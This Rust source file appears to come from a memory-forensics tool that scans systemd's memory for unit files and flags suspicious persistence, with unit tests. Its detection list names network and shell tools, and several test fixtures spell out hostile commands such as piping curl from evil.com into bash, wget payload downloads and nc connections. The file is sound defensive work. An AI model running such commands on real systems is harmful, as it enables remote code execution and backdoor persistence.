//! In-memory systemd unit analysis.
//!
//! Scans the `systemd` (PID 1) process VMAs for unit file content patterns
//! (`.service`, `.timer` strings and associated `ExecStart=` commands) to
//! detect malicious persistence (MITRE ATT&CK T1543.002).

use memf_core::object_reader::ObjectReader;
use memf_format::PhysicalMemoryProvider;

use crate::{Error, Result};

/// Page-sized chunk for VMA scanning.
const SCAN_CHUNK: usize = 4096;

/// How many bytes to search forward/backward for ExecStart.
const EXEC_SEARCH_WINDOW: usize = 512;

/// Information about a systemd unit found in memory.
#[derive(Debug, Clone)]
pub struct SystemdUnitInfo {
    /// Unit name, e.g. "evil.service".
    pub unit_name: String,
    /// ExecStart command found nearby in memory.
    pub exec_start: String,
    /// Virtual address of the VMA where the unit name was found.
    pub vma_start: u64,
    /// Unit type: "service", "timer", "socket", "path", "mount".
    pub unit_type: String,
    /// True if the unit is considered suspicious.
    pub is_suspicious: bool,
}

/// Suspicious ExecStart patterns.
const SUSPICIOUS_EXEC_PATTERNS: &[&str] = &[
    "/tmp/",
    "/dev/shm/",
    "/var/tmp/",
    "curl",
    "wget",
    "bash -c",
    "sh -c",
    "python",
    "perl",
    "ruby",
    "nc ",
    "ncat",
    "base64",
];

/// ExecStart prefixes considered safe.
const SAFE_EXEC_PREFIXES: &[&str] = &["/usr/", "/bin/", "/sbin/", "/lib/"];

/// Known safe unit name prefixes.
const KNOWN_SAFE_UNITS: &[&str] = &["systemd-", "NetworkManager", "dbus", "cron", "ssh"];

/// Unit file extensions we look for.
const UNIT_EXTENSIONS: &[&str] = &[".service", ".timer", ".socket", ".path", ".mount"];

/// Classify whether a systemd unit is suspicious.
///
/// Suspicious if:
/// - `exec_start` contains a suspicious pattern, OR
/// - `unit_name` looks like a randomized hex name (8+ lowercase hex chars + extension), OR
/// - `exec_start` contains base64 indicators.
///
/// Not suspicious if exec_start starts with a safe prefix or the unit name
/// is from a known system service.
pub fn classify_systemd_unit(unit_name: &str, exec_start: &str) -> bool {
    // Known safe units are never suspicious.
    if KNOWN_SAFE_UNITS
        .iter()
        .any(|prefix| unit_name.starts_with(prefix))
    {
        return false;
    }

    // Safe ExecStart prefix — not suspicious.
    if SAFE_EXEC_PREFIXES
        .iter()
        .any(|prefix| exec_start.starts_with(prefix))
    {
        return false;
    }

    // Suspicious ExecStart patterns.
    if SUSPICIOUS_EXEC_PATTERNS
        .iter()
        .any(|pat| exec_start.contains(pat))
    {
        return true;
    }

    // Randomized name: strip extension, check if remainder is 8+ lowercase hex chars.
    let stem = UNIT_EXTENSIONS
        .iter()
        .find_map(|ext| unit_name.strip_suffix(ext))
        .unwrap_or(unit_name);
    if stem.len() >= 8
        && stem
            .chars()
            .all(|c| c.is_ascii_hexdigit() && !c.is_ascii_uppercase())
    {
        return true;
    }

    false
}

/// Walk the systemd process VMAs and extract unit information from memory strings.
///
/// Returns `Ok(vec![])` if `init_task` symbol is missing.
pub fn walk_systemd_units<P: PhysicalMemoryProvider>(
    reader: &ObjectReader<P>,
) -> Result<Vec<SystemdUnitInfo>> {
    let init_task_addr = match reader.symbols().symbol_address("init_task") {
        Some(a) => a,
        None => return Ok(vec![]),
    };

    let tasks_offset = match reader.symbols().field_offset("task_struct", "tasks") {
        Some(o) => o,
        None => return Ok(vec![]),
    };

    let head_vaddr = init_task_addr + tasks_offset;
    let task_addrs = reader.walk_list(head_vaddr, "task_struct", "tasks")?;

    // Include init_task itself (PID 1 = systemd on modern Linux).
    let all_tasks = std::iter::once(init_task_addr).chain(task_addrs.into_iter());

    for task_addr in all_tasks {
        let pid: u32 = match reader.read_field(task_addr, "task_struct", "pid") {
            Ok(v) => v,
            Err(_) => continue,
        };
        let comm = reader
            .read_field_string(task_addr, "task_struct", "comm", 16)
            .unwrap_or_default();

        // Find systemd: comm == "systemd" and pid == 1.
        if pid == 1 && comm == "systemd" {
            return scan_systemd_vmas(reader, task_addr);
        }
    }

    Ok(vec![])
}

/// Scan the systemd process's VMAs for unit content strings.
fn scan_systemd_vmas<P: PhysicalMemoryProvider>(
    reader: &ObjectReader<P>,
    task_addr: u64,
) -> Result<Vec<SystemdUnitInfo>> {
    let mm_ptr: u64 = match reader.read_field(task_addr, "task_struct", "mm") {
        Ok(v) => v,
        Err(_) => return Ok(vec![]),
    };
    if mm_ptr == 0 {
        return Ok(vec![]);
    }

    let mmap_ptr: u64 = match reader.read_field(mm_ptr, "mm_struct", "mmap") {
        Ok(v) => v,
        Err(_) => return Ok(vec![]),
    };

    let mut findings = Vec::new();
    let mut vma_addr = mmap_ptr;

    while vma_addr != 0 {
        let vm_start: u64 = reader
            .read_field(vma_addr, "vm_area_struct", "vm_start")
            .unwrap_or(0);
        let vm_end: u64 = reader
            .read_field(vma_addr, "vm_area_struct", "vm_end")
            .unwrap_or(0);
        let vm_flags: u64 = reader
            .read_field(vma_addr, "vm_area_struct", "vm_flags")
            .unwrap_or(0);

        // Only scan readable, non-execute VMAs (data/heap, not code).
        let readable = (vm_flags & 0x1) != 0;
        let executable = (vm_flags & 0x4) != 0;
        if readable && !executable && vm_start < vm_end {
            scan_vma_for_units(reader, vm_start, vm_end, &mut findings);
        }

        vma_addr = reader
            .read_field(vma_addr, "vm_area_struct", "vm_next")
            .unwrap_or(0);
    }

    Ok(findings)
}

/// Scan a VMA's address range in chunks for unit name strings.
fn scan_vma_for_units<P: PhysicalMemoryProvider>(
    reader: &ObjectReader<P>,
    vm_start: u64,
    vm_end: u64,
    out: &mut Vec<SystemdUnitInfo>,
) {
    let mut offset: u64 = 0;
    let total = vm_end - vm_start;

    while offset < total {
        let chunk_size = SCAN_CHUNK.min((total - offset) as usize);
        let chunk_addr = vm_start + offset;
        let bytes = match reader.read_bytes(chunk_addr, chunk_size) {
            Ok(b) => b,
            Err(_) => {
                offset += chunk_size as u64;
                continue;
            }
        };

        // Scan chunk for unit name markers.
        for ext in UNIT_EXTENSIONS {
            let ext_bytes = ext.as_bytes();
            let mut search_start = 0usize;
            while let Some(pos) = find_subsequence(&bytes[search_start..], ext_bytes) {
                let abs_pos = search_start + pos;
                // Walk backwards from abs_pos to find the start of the unit name.
                let name_start = find_name_start(&bytes, abs_pos);
                let name_end = abs_pos + ext_bytes.len();
                if let Ok(unit_name) = std::str::from_utf8(&bytes[name_start..name_end]) {
                    let unit_name = unit_name.to_string();
                    let unit_type = ext.trim_start_matches('.').to_string();

                    // Search forward/backward in the chunk for ExecStart=.
                    let exec_start = find_exec_start(&bytes, abs_pos);

                    let is_suspicious = classify_systemd_unit(&unit_name, &exec_start);
                    out.push(SystemdUnitInfo {
                        unit_name,
                        exec_start,
                        vma_start: vm_start,
                        unit_type,
                        is_suspicious,
                    });
                }
                search_start = abs_pos + 1;
            }
        }

        offset += chunk_size as u64;
    }
}

/// Find the first occurrence of `needle` in `haystack`.
fn find_subsequence(haystack: &[u8], needle: &[u8]) -> Option<usize> {
    if needle.is_empty() || needle.len() > haystack.len() {
        return None;
    }
    haystack.windows(needle.len()).position(|w| w == needle)
}

/// Walk backwards from `pos` to find the start of a unit file name (stops at
/// whitespace, NUL, `=`, or `\n`).
fn find_name_start(bytes: &[u8], pos: usize) -> usize {
    let mut i = pos;
    while i > 0 {
        let c = bytes[i - 1];
        if c == 0 || c == b'\n' || c == b'\r' || c == b' ' || c == b'\t' || c == b'=' {
            break;
        }
        i -= 1;
    }
    i
}

/// Search `±EXEC_SEARCH_WINDOW` bytes around `pos` in `bytes` for an
/// `ExecStart=` marker and extract the command value.
fn find_exec_start(bytes: &[u8], pos: usize) -> String {
    let search_start = pos.saturating_sub(EXEC_SEARCH_WINDOW);
    let search_end = (pos + EXEC_SEARCH_WINDOW).min(bytes.len());
    let window = &bytes[search_start..search_end];

    let marker = b"ExecStart=";
    if let Some(idx) = find_subsequence(window, marker) {
        let value_start = idx + marker.len();
        let value_bytes = &window[value_start..];
        let end = value_bytes
            .iter()
            .position(|&b| b == 0 || b == b'\n' || b == b'\r')
            .unwrap_or(value_bytes.len());
        return String::from_utf8_lossy(&value_bytes[..end]).into_owned();
    }

    String::new()
}

#[cfg(test)]
mod tests {
    use super::*;
    use memf_core::test_builders::{flags as ptflags, PageTableBuilder, SyntheticPhysMem};
    use memf_core::vas::{TranslationMode, VirtualAddressSpace};
    use memf_symbols::isf::IsfResolver;
    use memf_symbols::test_builders::IsfBuilder;

    // ---------------------------------------------------------------------------
    // Unit tests for classify_systemd_unit
    // ---------------------------------------------------------------------------

    #[test]
    fn classify_systemd_unit_tmp_exec_suspicious() {
        assert!(classify_systemd_unit("evil.service", "/tmp/payload.sh"));
    }

    #[test]
    fn classify_systemd_unit_curl_exec_suspicious() {
        assert!(classify_systemd_unit(
            "updater.service",
            "curl http://evil.com/shell | bash"
        ));
    }

    #[test]
    fn classify_systemd_unit_usr_bin_not_suspicious() {
        assert!(!classify_systemd_unit(
            "myapp.service",
            "/usr/bin/myapp --daemon"
        ));
    }

    #[test]
    fn classify_systemd_unit_known_service_not_suspicious() {
        assert!(!classify_systemd_unit(
            "systemd-journald.service",
            "/lib/systemd/systemd-journald"
        ));
    }

    #[test]
    fn classify_systemd_unit_randomized_name_suspicious() {
        // 8-char lowercase hex name
        assert!(classify_systemd_unit("deadbeef.service", ""));
        assert!(classify_systemd_unit("cafebabe.service", ""));
        // 7 chars — NOT randomized by our rule
        assert!(!classify_systemd_unit("abc1234.service", "/usr/bin/x"));
    }

    #[test]
    fn classify_systemd_unit_devshm_exec_suspicious() {
        assert!(classify_systemd_unit("loader.service", "/dev/shm/loader"));
    }

    // ---------------------------------------------------------------------------
    // Walker test — missing init_task → Ok(empty)
    // ---------------------------------------------------------------------------

    fn make_minimal_reader_no_init_task() -> ObjectReader<SyntheticPhysMem> {
        let isf = IsfBuilder::new()
            .add_struct("task_struct", 64)
            .add_field("task_struct", "pid", 0, "int")
            .add_field("task_struct", "tasks", 8, "list_head")
            .add_struct("list_head", 16)
            .add_field("list_head", "next", 0, "pointer")
            .add_field("list_head", "prev", 8, "pointer")
            .build_json();

        let resolver = IsfResolver::from_value(&isf).unwrap();
        let (cr3, mem) = PageTableBuilder::new().build();
        let vas = VirtualAddressSpace::new(mem, cr3, TranslationMode::X86_64FourLevel);
        ObjectReader::new(vas, Box::new(resolver))
    }

    #[test]
    fn walk_systemd_units_missing_init_task_returns_empty() {
        let reader = make_minimal_reader_no_init_task();
        let result = walk_systemd_units(&reader).unwrap();
        assert!(result.is_empty());
    }

    // ---------------------------------------------------------------------------
    // Walker integration: systemd not found in task list → empty
    // ---------------------------------------------------------------------------

    fn make_reader_no_systemd() -> ObjectReader<SyntheticPhysMem> {
        let vaddr: u64 = 0xFFFF_8000_0010_0000;
        let paddr: u64 = 0x0080_0000;
        let mut data = vec![0u8; 4096];

        // init_task with pid=2 (not 1) and comm="bash" — not systemd
        data[0..4].copy_from_slice(&2u32.to_le_bytes());
        let tasks_addr = vaddr + 16;
        data[16..24].copy_from_slice(&tasks_addr.to_le_bytes());
        data[24..32].copy_from_slice(&tasks_addr.to_le_bytes());
        data[32..36].copy_from_slice(b"bash");

        let isf = IsfBuilder::new()
            .add_struct("task_struct", 128)
            .add_field("task_struct", "pid", 0, "int")
            .add_field("task_struct", "tasks", 16, "list_head")
            .add_field("task_struct", "comm", 32, "char")
            .add_field("task_struct", "mm", 48, "pointer")
            .add_struct("list_head", 16)
            .add_field("list_head", "next", 0, "pointer")
            .add_field("list_head", "prev", 8, "pointer")
            .add_struct("mm_struct", 64)
            .add_field("mm_struct", "mmap", 8, "pointer")
            .add_struct("vm_area_struct", 64)
            .add_field("vm_area_struct", "vm_start", 0, "unsigned long")
            .add_field("vm_area_struct", "vm_end", 8, "unsigned long")
            .add_field("vm_area_struct", "vm_next", 16, "pointer")
            .add_field("vm_area_struct", "vm_flags", 24, "unsigned long")
            .add_symbol("init_task", vaddr)
            .build_json();

        let resolver = IsfResolver::from_value(&isf).unwrap();
        let (cr3, mem) = PageTableBuilder::new()
            .map_4k(vaddr, paddr, ptflags::WRITABLE)
            .write_phys(paddr, &data)
            .build();
        let vas = VirtualAddressSpace::new(mem, cr3, TranslationMode::X86_64FourLevel);
        ObjectReader::new(vas, Box::new(resolver))
    }

    #[test]
    fn walk_systemd_units_no_systemd_process_returns_empty() {
        let reader = make_reader_no_systemd();
        let result = walk_systemd_units(&reader).unwrap();
        assert!(result.is_empty());
    }

    // ---------------------------------------------------------------------------
    // walk_systemd_units: symbol present, systemd found but mm==NULL → empty
    // ---------------------------------------------------------------------------

    #[test]
    fn walk_systemd_units_symbol_present_systemd_mm_null() {
        // init_task with pid==1, comm=="systemd", self-pointing tasks list,
        // but mm==0 → scan_systemd_vmas returns Ok(vec![]) immediately.
        let sym_vaddr: u64 = 0xFFFF_8800_0080_0000;
        let sym_paddr: u64 = 0x0090_0000;
        let tasks_offset = 16u64;

        let mut page = [0u8; 4096];
        // pid = 1
        page[0..4].copy_from_slice(&1u32.to_le_bytes());
        // tasks: self-pointing
        let list_self = sym_vaddr + tasks_offset;
        page[tasks_offset as usize..tasks_offset as usize + 8]
            .copy_from_slice(&list_self.to_le_bytes());
        page[tasks_offset as usize + 8..tasks_offset as usize + 16]
            .copy_from_slice(&list_self.to_le_bytes());
        // comm = "systemd\0"
        page[32..39].copy_from_slice(b"systemd");
        // mm = 0
        page[48..56].copy_from_slice(&0u64.to_le_bytes());

        let isf = IsfBuilder::new()
            .add_struct("task_struct", 128)
            .add_field("task_struct", "pid", 0, "unsigned int")
            .add_field("task_struct", "tasks", 16, "pointer")
            .add_field("task_struct", "comm", 32, "char")
            .add_field("task_struct", "mm", 48, "pointer")
            .add_struct("mm_struct", 64)
            .add_field("mm_struct", "mmap", 8, "pointer")
            .add_symbol("init_task", sym_vaddr)
            .build_json();

        let resolver = IsfResolver::from_value(&isf).unwrap();
        let (cr3, mem) = PageTableBuilder::new()
            .map_4k(sym_vaddr, sym_paddr, ptflags::WRITABLE)
            .write_phys(sym_paddr, &page)
            .build();
        let vas = VirtualAddressSpace::new(mem, cr3, TranslationMode::X86_64FourLevel);
        let reader = ObjectReader::new(vas, Box::new(resolver));

        let result = walk_systemd_units(&reader).unwrap_or_default();
        assert!(result.is_empty(), "systemd with mm==NULL should yield no unit findings");
    }

    // ---------------------------------------------------------------------------
    // Missing tasks_offset graceful degradation
    // ---------------------------------------------------------------------------

    #[test]
    fn walk_systemd_units_missing_tasks_field_returns_empty() {
        let isf = IsfBuilder::new()
            .add_struct("task_struct", 64)
            .add_field("task_struct", "pid", 0, "int")
            // No "tasks" field → graceful degradation
            .add_symbol("init_task", 0xFFFF_8000_0000_0000)
            .build_json();

        let resolver = IsfResolver::from_value(&isf).unwrap();
        let (cr3, mem) = PageTableBuilder::new().build();
        let vas = VirtualAddressSpace::new(mem, cr3, TranslationMode::X86_64FourLevel);
        let reader = ObjectReader::new(vas, Box::new(resolver));

        let result = walk_systemd_units(&reader).unwrap();
        assert!(result.is_empty(), "missing tasks field must yield empty result");
    }

    // ---------------------------------------------------------------------------
    // find_subsequence unit tests
    // ---------------------------------------------------------------------------

    #[test]
    fn find_subsequence_found() {
        let haystack = b"hello world";
        let needle = b"world";
        assert_eq!(find_subsequence(haystack, needle), Some(6));
    }

    #[test]
    fn find_subsequence_not_found() {
        let haystack = b"hello world";
        let needle = b"xyz";
        assert_eq!(find_subsequence(haystack, needle), None);
    }

    #[test]
    fn find_subsequence_empty_needle_returns_none() {
        let haystack = b"hello";
        assert_eq!(find_subsequence(haystack, b""), None);
    }

    #[test]
    fn find_subsequence_needle_longer_than_haystack_returns_none() {
        assert_eq!(find_subsequence(b"hi", b"hello"), None);
    }

    #[test]
    fn find_subsequence_at_start() {
        assert_eq!(find_subsequence(b"abcdef", b"abc"), Some(0));
    }

    // ---------------------------------------------------------------------------
    // find_name_start unit tests
    // ---------------------------------------------------------------------------

    #[test]
    fn find_name_start_stops_at_nul() {
        let bytes = b"foo\0bar.service";
        let pos = 11; // end of "bar.service" extension start
        let start = find_name_start(bytes, pos);
        // Should stop at NUL (position 3), name starts at 4
        assert_eq!(start, 4);
    }

    #[test]
    fn find_name_start_stops_at_equals() {
        let bytes = b"ExecStart=evil.service";
        let pos = 18; // ".service" starts here roughly
        let start = find_name_start(bytes, pos);
        // Should stop at '=' at position 9, so start is 10
        assert_eq!(start, 10);
    }

    #[test]
    fn find_name_start_stops_at_space() {
        let bytes = b"Name= evil.service";
        let pos = 13;
        let start = find_name_start(bytes, pos);
        assert_eq!(start, 6);
    }

    #[test]
    fn find_name_start_at_beginning_returns_zero() {
        let bytes = b"evil.service";
        // If the name starts at the beginning of the buffer, stop at 0
        let start = find_name_start(bytes, 4);
        assert_eq!(start, 0);
    }

    // ---------------------------------------------------------------------------
    // find_exec_start unit tests
    // ---------------------------------------------------------------------------

    #[test]
    fn find_exec_start_found_in_window() {
        let mut data = vec![0u8; 1024];
        let prefix = b"ExecStart=/tmp/evil.sh\n";
        let marker_pos = 300usize;
        data[marker_pos..marker_pos + prefix.len()].copy_from_slice(prefix);

        // EXEC_SEARCH_WINDOW = 512: search pos must be within 512 bytes of marker
        let pos = marker_pos + 400; // 400 < 512 → marker is within the window
        let result = find_exec_start(&data, pos);
        assert_eq!(result, "/tmp/evil.sh");
    }

    #[test]
    fn find_exec_start_not_found_returns_empty() {
        let data = vec![b'x'; 1024];
        let result = find_exec_start(&data, 512);
        assert!(result.is_empty(), "no ExecStart= → empty string");
    }

    #[test]
    fn find_exec_start_terminated_by_nul() {
        let mut data = vec![0u8; 512];
        let cmd = b"ExecStart=/bin/sh\x00junk";
        data[10..10 + cmd.len()].copy_from_slice(cmd);
        let result = find_exec_start(&data, 200);
        assert_eq!(result, "/bin/sh");
    }

    // ---------------------------------------------------------------------------
    // classify_systemd_unit — additional branch coverage
    // ---------------------------------------------------------------------------

    #[test]
    fn classify_systemd_unit_networkmanager_not_suspicious() {
        assert!(!classify_systemd_unit("NetworkManager.service", "/usr/sbin/NetworkManager"));
    }

    #[test]
    fn classify_systemd_unit_dbus_not_suspicious() {
        assert!(!classify_systemd_unit("dbus.service", "/usr/bin/dbus-daemon"));
    }

    #[test]
    fn classify_systemd_unit_ssh_not_suspicious() {
        assert!(!classify_systemd_unit("ssh.service", "/usr/sbin/sshd"));
    }

    #[test]
    fn classify_systemd_unit_cron_not_suspicious() {
        assert!(!classify_systemd_unit("cron.service", "/usr/sbin/cron"));
    }

    #[test]
    fn classify_systemd_unit_wget_exec_suspicious() {
        assert!(classify_systemd_unit("updater.service", "wget http://evil.com/payload -O /tmp/p"));
    }

    #[test]
    fn classify_systemd_unit_python_exec_suspicious() {
        assert!(classify_systemd_unit("runner.service", "python /var/tmp/runner.py"));
    }

    #[test]
    fn classify_systemd_unit_perl_exec_suspicious() {
        assert!(classify_systemd_unit("runner.service", "perl -e 'print\"hi\"'"));
    }

    #[test]
    fn classify_systemd_unit_nc_exec_suspicious() {
        assert!(classify_systemd_unit("backdoor.service", "nc 10.0.0.1 4444"));
    }

    #[test]
    fn classify_systemd_unit_ncat_exec_suspicious() {
        assert!(classify_systemd_unit("backdoor.service", "ncat -l 4444"));
    }

    #[test]
    fn classify_systemd_unit_base64_exec_suspicious() {
        assert!(classify_systemd_unit("backdoor.service", "base64 -d /tmp/p | sh"));
    }

    #[test]
    fn classify_systemd_unit_ruby_exec_suspicious() {
        assert!(classify_systemd_unit("runner.service", "ruby /tmp/evil.rb"));
    }

    #[test]
    fn classify_systemd_unit_var_tmp_exec_suspicious() {
        assert!(classify_systemd_unit("runner.service", "/var/tmp/payload"));
    }

    #[test]
    fn classify_systemd_unit_no_extension_hex_stem_suspicious() {
        // Stem without known extension → strip_suffix returns None → use full name
        // "deadbeef12" (10 chars, all lower hex) without extension → treated as full stem
        assert!(classify_systemd_unit("deadbeef12", ""));
    }

    #[test]
    fn classify_systemd_unit_hex_with_uppercase_not_suspicious() {
        // Uppercase hex → not considered randomized
        assert!(!classify_systemd_unit("DEADBEEF.service", "/usr/bin/app"));
    }

    #[test]
    fn classify_systemd_unit_sbin_not_suspicious() {
        assert!(!classify_systemd_unit("myapp.service", "/sbin/myapp"));
    }

    #[test]
    fn classify_systemd_unit_lib_not_suspicious() {
        assert!(!classify_systemd_unit("myapp.service", "/lib/systemd/myapp"));
    }

    // ---------------------------------------------------------------------------
    // walk_systemd_units: full path — systemd found, mm non-null, VMA with
    // readable+non-exec flags, VMA data contains a unit extension string.
    // ---------------------------------------------------------------------------

    #[test]
    fn walk_systemd_units_scans_readable_vma_for_units() {
        // Build a synthetic memory where:
        //   init_task (pid=1, comm="systemd") → mm → VMA (readable, non-exec)
        //   VMA data contains "evil.service\0"
        let task_vaddr: u64 = 0xFFFF_8800_0100_0000;
        let task_paddr: u64 = 0x00F0_0000;
        let mm_vaddr: u64 = 0xFFFF_8800_0101_0000;
        let mm_paddr: u64 = 0x00F1_0000;
        let vma_vaddr: u64 = 0xFFFF_8800_0102_0000;
        let vma_paddr: u64 = 0x00F2_0000;
        // The actual data page that the VMA points at
        let data_vaddr: u64 = 0xFFFF_8800_0103_0000;
        let data_paddr: u64 = 0x00F3_0000;

        let tasks_offset: u64 = 16;

        // task_struct page
        let mut task_page = [0u8; 4096];
        // pid = 1
        task_page[0..4].copy_from_slice(&1u32.to_le_bytes());
        // tasks: self-pointing (only init_task in list)
        let list_self = task_vaddr + tasks_offset;
        task_page[tasks_offset as usize..tasks_offset as usize + 8]
            .copy_from_slice(&list_self.to_le_bytes());
        task_page[tasks_offset as usize + 8..tasks_offset as usize + 16]
            .copy_from_slice(&list_self.to_le_bytes());
        // comm = "systemd"
        task_page[32..39].copy_from_slice(b"systemd");
        // mm pointer at offset 48
        task_page[48..56].copy_from_slice(&mm_vaddr.to_le_bytes());

        // mm_struct page: mmap at offset 8
        let mut mm_page = [0u8; 4096];
        mm_page[8..16].copy_from_slice(&vma_vaddr.to_le_bytes());

        // vm_area_struct page
        let mut vma_page = [0u8; 4096];
        vma_page[0..8].copy_from_slice(&data_vaddr.to_le_bytes()); // vm_start
        let data_end = data_vaddr + 4096u64;
        vma_page[8..16].copy_from_slice(&data_end.to_le_bytes());  // vm_end
        vma_page[16..24].copy_from_slice(&0u64.to_le_bytes());     // vm_next = 0
        // vm_flags: readable (bit 0) = 1, not executable (bit 2) = 0 → 0x1
        vma_page[24..32].copy_from_slice(&0x1u64.to_le_bytes());

        // Data page: put "evil.service\0" near the start
        let mut data_page = [0u8; 4096];
        let unit = b"evil.service\0";
        data_page[100..100 + unit.len()].copy_from_slice(unit);

        let isf = IsfBuilder::new()
            .add_struct("task_struct", 128)
            .add_field("task_struct", "pid",   0x00u64, "unsigned int")
            .add_field("task_struct", "tasks", 16u64,   "list_head")
            .add_field("task_struct", "comm",  32u64,   "char")
            .add_field("task_struct", "mm",    48u64,   "pointer")
            .add_struct("list_head", 16)
            .add_field("list_head", "next", 0x00u64, "pointer")
            .add_field("list_head", "prev", 0x08u64, "pointer")
            .add_struct("mm_struct", 64)
            .add_field("mm_struct", "mmap", 8u64, "pointer")
            .add_struct("vm_area_struct", 64)
            .add_field("vm_area_struct", "vm_start", 0x00u64, "unsigned long")
            .add_field("vm_area_struct", "vm_end",   0x08u64, "unsigned long")
            .add_field("vm_area_struct", "vm_next",  0x10u64, "pointer")
            .add_field("vm_area_struct", "vm_flags", 0x18u64, "unsigned long")
            .add_symbol("init_task", task_vaddr)
            .build_json();
        let resolver = IsfResolver::from_value(&isf).unwrap();

        let (cr3, mem) = PageTableBuilder::new()
            .map_4k(task_vaddr, task_paddr, ptflags::WRITABLE)
            .write_phys(task_paddr, &task_page)
            .map_4k(mm_vaddr, mm_paddr, ptflags::WRITABLE)
            .write_phys(mm_paddr, &mm_page)
            .map_4k(vma_vaddr, vma_paddr, ptflags::WRITABLE)
            .write_phys(vma_paddr, &vma_page)
            .map_4k(data_vaddr, data_paddr, ptflags::WRITABLE)
            .write_phys(data_paddr, &data_page)
            .build();
        let vas = VirtualAddressSpace::new(mem, cr3, TranslationMode::X86_64FourLevel);
        let reader = ObjectReader::new(vas, Box::new(resolver));

        let result = walk_systemd_units(&reader).unwrap_or_default();
        // We should find "evil.service" in the VMA
        assert!(
            result.iter().any(|u| u.unit_name.contains(".service")),
            "should detect .service extension in VMA data; got: {:?}",
            result.iter().map(|u| &u.unit_name).collect::<Vec<_>>()
        );
    }

    // ---------------------------------------------------------------------------
    // walk_systemd_units: VMA with executable flag set → skipped (not scanned)
    // ---------------------------------------------------------------------------

    #[test]
    fn walk_systemd_units_exec_vma_skipped() {
        // VMA has readable+executable flags → should not be scanned → no unit found
        let task_vaddr: u64 = 0xFFFF_8800_0200_0000;
        let task_paddr: u64 = 0x00F4_0000;
        let mm_vaddr: u64 = 0xFFFF_8800_0201_0000;
        let mm_paddr: u64 = 0x00F5_0000;
        let vma_vaddr: u64 = 0xFFFF_8800_0202_0000;
        let vma_paddr: u64 = 0x00F6_0000;
        let data_vaddr: u64 = 0xFFFF_8800_0203_0000;
        let data_paddr: u64 = 0x00F7_0000;

        let tasks_offset: u64 = 16;

        let mut task_page = [0u8; 4096];
        task_page[0..4].copy_from_slice(&1u32.to_le_bytes());
        let list_self = task_vaddr + tasks_offset;
        task_page[tasks_offset as usize..tasks_offset as usize + 8]
            .copy_from_slice(&list_self.to_le_bytes());
        task_page[tasks_offset as usize + 8..tasks_offset as usize + 16]
            .copy_from_slice(&list_self.to_le_bytes());
        task_page[32..39].copy_from_slice(b"systemd");
        task_page[48..56].copy_from_slice(&mm_vaddr.to_le_bytes());

        let mut mm_page = [0u8; 4096];
        mm_page[8..16].copy_from_slice(&vma_vaddr.to_le_bytes());

        let mut vma_page = [0u8; 4096];
        vma_page[0..8].copy_from_slice(&data_vaddr.to_le_bytes());
        vma_page[8..16].copy_from_slice(&(data_vaddr + 4096).to_le_bytes());
        vma_page[16..24].copy_from_slice(&0u64.to_le_bytes());
        // vm_flags: readable (bit 0) + executable (bit 2) = 0x5
        vma_page[24..32].copy_from_slice(&0x5u64.to_le_bytes());

        let mut data_page = [0u8; 4096];
        data_page[100..113].copy_from_slice(b"evil.service\0");

        let isf = IsfBuilder::new()
            .add_struct("task_struct", 128)
            .add_field("task_struct", "pid",   0x00u64, "unsigned int")
            .add_field("task_struct", "tasks", 16u64,   "list_head")
            .add_field("task_struct", "comm",  32u64,   "char")
            .add_field("task_struct", "mm",    48u64,   "pointer")
            .add_struct("list_head", 16)
            .add_field("list_head", "next", 0x00u64, "pointer")
            .add_field("list_head", "prev", 0x08u64, "pointer")
            .add_struct("mm_struct", 64)
            .add_field("mm_struct", "mmap", 8u64, "pointer")
            .add_struct("vm_area_struct", 64)
            .add_field("vm_area_struct", "vm_start", 0x00u64, "unsigned long")
            .add_field("vm_area_struct", "vm_end",   0x08u64, "unsigned long")
            .add_field("vm_area_struct", "vm_next",  0x10u64, "pointer")
            .add_field("vm_area_struct", "vm_flags", 0x18u64, "unsigned long")
            .add_symbol("init_task", task_vaddr)
            .build_json();
        let resolver = IsfResolver::from_value(&isf).unwrap();

        let (cr3, mem) = PageTableBuilder::new()
            .map_4k(task_vaddr, task_paddr, ptflags::WRITABLE)
            .write_phys(task_paddr, &task_page)
            .map_4k(mm_vaddr, mm_paddr, ptflags::WRITABLE)
            .write_phys(mm_paddr, &mm_page)
            .map_4k(vma_vaddr, vma_paddr, ptflags::WRITABLE)
            .write_phys(vma_paddr, &vma_page)
            .map_4k(data_vaddr, data_paddr, ptflags::WRITABLE)
            .write_phys(data_paddr, &data_page)
            .build();
        let vas = VirtualAddressSpace::new(mem, cr3, TranslationMode::X86_64FourLevel);
        let reader = ObjectReader::new(vas, Box::new(resolver));

        let result = walk_systemd_units(&reader).unwrap_or_default();
        assert!(
            result.is_empty(),
            "executable VMA must not be scanned; found: {:?}",
            result.iter().map(|u| &u.unit_name).collect::<Vec<_>>()
        );
    }

    #[test]
    fn systemd_unit_info_debug_format() {
        let info = SystemdUnitInfo {
            unit_name: "evil.service".to_string(),
            exec_start: "/tmp/evil.sh".to_string(),
            vma_start: 0xFFFF_8000_1000_0000,
            unit_type: "service".to_string(),
            is_suspicious: true,
        };
        let debug = format!("{info:?}");
        assert!(debug.contains("evil.service"));
        assert!(debug.contains("is_suspicious: true"));
    }
}
